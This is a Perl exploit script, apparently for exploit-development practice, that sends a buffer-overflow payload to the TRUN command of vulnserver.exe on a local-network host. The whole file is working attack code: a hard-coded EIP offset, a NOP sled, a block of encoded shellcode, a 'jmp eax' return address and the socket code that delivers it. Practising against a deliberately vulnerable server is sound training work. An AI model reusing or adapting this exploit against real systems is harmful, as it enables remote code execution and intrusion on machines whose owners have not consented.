#!/usr/bin/perl
use strict;
use warnings;

use IO::Socket::INET;

my $host = "192.168.1.117";
my $port = 9999;


# EIP offset at 2003
my $payload = "\x50\x5c\x83\xEC\x20";
$payload .= "\x90" x 16;
$payload .= "\xdb\xdf\xb8\x89\xd7\x09\xc8\xd9\x74\x24\xf4\x5b\x2b\xc9" .
"\xb1\x52\x31\x43\x17\x83\xeb\xfc\x03\xca\xc4\xeb\x3d\x30" .
"\x02\x69\xbd\xc8\xd3\x0e\x37\x2d\xe2\x0e\x23\x26\x55\xbf" .
"\x27\x6a\x5a\x34\x65\x9e\xe9\x38\xa2\x91\x5a\xf6\x94\x9c" .
"\x5b\xab\xe5\xbf\xdf\xb6\x39\x1f\xe1\x78\x4c\x5e\x26\x64" .
"\xbd\x32\xff\xe2\x10\xa2\x74\xbe\xa8\x49\xc6\x2e\xa9\xae" .
"\x9f\x51\x98\x61\xab\x0b\x3a\x80\x78\x20\x73\x9a\x9d\x0d" .
"\xcd\x11\x55\xf9\xcc\xf3\xa7\x02\x62\x3a\x08\xf1\x7a\x7b" .
"\xaf\xea\x08\x75\xd3\x97\x0a\x42\xa9\x43\x9e\x50\x09\x07" .
"\x38\xbc\xab\xc4\xdf\x37\xa7\xa1\x94\x1f\xa4\x34\x78\x14" .
"\xd0\xbd\x7f\xfa\x50\x85\x5b\xde\x39\x5d\xc5\x47\xe4\x30" .
"\xfa\x97\x47\xec\x5e\xdc\x6a\xf9\xd2\xbf\xe2\xce\xde\x3f" .
"\xf3\x58\x68\x4c\xc1\xc7\xc2\xda\x69\x8f\xcc\x1d\x8d\xba" .
"\xa9\xb1\x70\x45\xca\x98\xb6\x11\x9a\xb2\x1f\x1a\x71\x42" .
"\x9f\xcf\xd6\x12\x0f\xa0\x96\xc2\xef\x10\x7f\x08\xe0\x4f" .
"\x9f\x33\x2a\xf8\x0a\xce\xbd\xc7\x63\xd1\x45\xa0\x71\xd1" .
"\xa4\xe7\xff\x37\xac\x17\x56\xe0\x59\x81\xf3\x7a\xfb\x4e" .
"\x2e\x07\x3b\xc4\xdd\xf8\xf2\x2d\xab\xea\x63\xde\xe6\x50" .
"\x25\xe1\xdc\xfc\xa9\x70\xbb\xfc\xa4\x68\x14\xab\xe1\x5f" .
"\x6d\x39\x1c\xf9\xc7\x5f\xdd\x9f\x20\xdb\x3a\x5c\xae\xe2" .
"\xcf\xd8\x94\xf4\x09\xe0\x90\xa0\xc5\xb7\x4e\x1e\xa0\x61" .
"\x21\xc8\x7a\xdd\xeb\x9c\xfb\x2d\x2c\xda\x03\x78\xda\x02" .
"\xb5\xd5\x9b\x3d\x7a\xb2\x2b\x46\x66\x22\xd3\x9d\x22\x42" .
"\x36\x37\x5f\xeb\xef\xd2\xe2\x76\x10\x09\x20\x8f\x93\xbb" .
"\xd9\x74\x8b\xce\xdc\x31\x0b\x23\xad\x2a\xfe\x43\x02\x4a" .
"\x2b";

$payload .= "A" x (2003 - length($payload));

# jmp eax in vulnserver.exe 0x00402d7b
$payload .= "\x7b\x2d\x40\x00";

my $sock = IO::Socket::INET->new(PeerAddr => $host,
                                 PeerPort => $port,
                                 Proto    => 'tcp');
$sock->send("TRUN ).:)" . $payload . "\n");
close $sock;
